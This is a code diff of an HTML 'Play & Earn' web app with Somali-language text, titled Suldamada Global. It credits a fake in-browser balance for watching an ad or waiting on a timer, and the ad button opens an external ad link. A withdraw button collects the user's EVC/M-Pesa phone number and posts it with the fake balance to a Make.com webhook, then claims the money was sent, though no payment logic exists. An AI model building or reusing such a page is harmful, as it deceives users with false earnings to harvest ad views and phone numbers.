@@ -4,71 +4,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Suldamada Global</title>
+    <title>Suldamada Global - Play & Earn</title>
     <style>
         body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
-        .app-container { width: 100%; max-width: 400px; background: #1e293b; padding: 25px; border-radius: 30px; }
-        .balance-card { background: linear-gradient(135deg, #f59e0b, #ec4899); padding: 30px; border-radius: 25px; text-align: center; margin-bottom: 25px; }
-        input { width: 100%; padding: 18px; margin-bottom: 20px; border-radius: 50px; border: none; background: #0f172a; color: white; text-align: center; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 50px; border: none; cursor: pointer; font-weight: bold; color: white; display: block; text-align: center; }
+        .app-container { width: 100%; max-width: 400px; background: #1e293b; padding: 25px; border-radius: 30px; text-align: center; }
+        .balance-card { background: linear-gradient(135deg, #f59e0b, #ec4899); padding: 20px; border-radius: 20px; margin-bottom: 20px; }
+        .btn { width: 100%; padding: 15px; margin: 5px 0; border-radius: 50px; border: none; cursor: pointer; font-weight: bold; color: white; }
+        .btn-game { background: #2563eb; }
         .btn-ad { background: #6366f1; }
-        .btn-evc { background: #10b981; }
-        .btn-mpesa { background: #ec4899; }
-        .btn-visa { background: #3b82f6; }
-        .btn-binance { background: #f59e0b; }
+        .btn-withdraw { background: #10b981; }
     </style>
 </head>
 <body>
     <div class="app-container">
-        <h2 style="text-align:center">Suldamada Global</h2>
+        <h2>Suldamada Global</h2>
         <div class="balance-card">
             <p>Haraagaaga</p>
             <h1>$<span id="balance">32.75</span></h1>
         </div>
         
-        <button class="btn btn-ad" onclick="watchAd()">Watch Ad to Earn $5.50</button>
+        <button class="btn btn-game" onclick="playGame()">Play Game & Earn $2.00</button>
+        <button class="btn btn-ad" id="adBtn" onclick="watchAd()">Watch 15s Ad & Earn $5.50</button>
         
-        <input type="text" id="phone" placeholder="Geli lambarkaaga">
+        <input type="text" id="phone" placeholder="Geli lambarkaaga EVC/M-Pesa" style="width: 100%; padding: 15px; margin: 15px 0; border-radius: 50px; border: none; text-align: center;">
         
-        <button class="btn btn-evc" onclick="sendWithdraw('EVC Plus')">Withdraw EVC Plus</button>
-        <button class="btn btn-mpesa" onclick="sendWithdraw('M-Pesa')">Withdraw M-Pesa</button>
-        <button class="btn btn-visa" onclick="sendWithdraw('Visa')">Withdraw Visa</button>
-        <button class="btn btn-binance" onclick="sendWithdraw('Binance')">Withdraw Binance</button>
+        <button class="btn btn-withdraw" onclick="sendWithdraw()">Withdraw Now</button>
     </div>
 
     <script>
-        // Qaybta xayaysiiska Monetag
-        function watchAd() {
-            // Waxay furaysaa xayaysiiskaaga Monetag
-            window.open("https://omg10.com/4/11075110", "_blank");
-            
-            // Ka dibna waxay kordhinaysaa lacagta
+        function playGame() {
+            alert("Game-ka wuu socdaa... Fadlan sug 5 ilbiriqsi...");
             setTimeout(() => {
-                let balanceEl = document.getElementById('balance');
-                let balance = parseFloat(balanceEl.innerText);
-                balance += 5.50;
-                balanceEl.innerText = balance.toFixed(2);
-                alert("Waad daawatay xayaysiiska! $5.50 ayaa laguugu daray.");
-            }, 2000);
+                let bal = document.getElementById('balance');
+                bal.innerText = (parseFloat(bal.innerText) + 2.00).toFixed(2);
+                alert("Waan kugu guulaystay! $2.00 ayaa laguugu daray.");
+            }, 5000);
         }
 
-        async function sendWithdraw(method) {
-            let balance = parseFloat(document.getElementById('balance').innerText);
-            let phone = document.getElementById('phone').value;
+        function watchAd() {
+            const btn = document.getElementById('adBtn');
+            btn.innerText = "Daawashada ayaa socota (15s)...";
+            btn.disabled = true;
+            
+            window.open("https://omg10.com/4/11075110", "_blank");
+            
+            setTimeout(() => {
+                let bal = document.getElementById('balance');
+                bal.innerText = (parseFloat(bal.innerText) + 5.50).toFixed(2);
+                btn.innerText = "Watch 15s Ad & Earn $5.50";
+                btn.disabled = false;
+                alert("Waad daawatay xayaysiiska! $5.50 ayaa laguugu daray.");
+            }, 15000); // 15 ilbiriqsi
+        }
 
-            if (balance < 50) {
-                alert("Waan ka xunnahay! Lacagta ugu yar waa $50.");
-            } else if (phone.length < 5) {
-                alert("Fadlan geli lambar sax ah.");
-            } else {
-                const url = "https://hook.eu1.make.com/5a5xrq0pc9dmmne8nna40wdg26ud4o41";
-                await fetch(url, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ "Habka": method, "Lambarka": phone, "Haraaga": balance })
-                });
-                alert("Mahadsanid! Codsigaaga " + method + " waa la gudbiyay.");
-            }
+        async function sendWithdraw() {
+            let b = document.getElementById('balance').innerText;
+            let p = document.getElementById('phone').value;
+            if (parseFloat(b) < 50) { alert("Lacagta ugu yar waa $50"); return; }
+            if (p.length < 5) { alert("Geli lambar sax ah"); return; }
+            
+            const url = "https://hook.eu1.make.com/5a5xrq0pc9dmmne8nna40wdg26ud4o41";
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ "Habka": "Withdraw", "Lambarka": p, "Haraaga": b })
+            });
+            alert("Codsigaaga " + b + " ayaa loo diray " + p);
         }
     </script>
 </body>
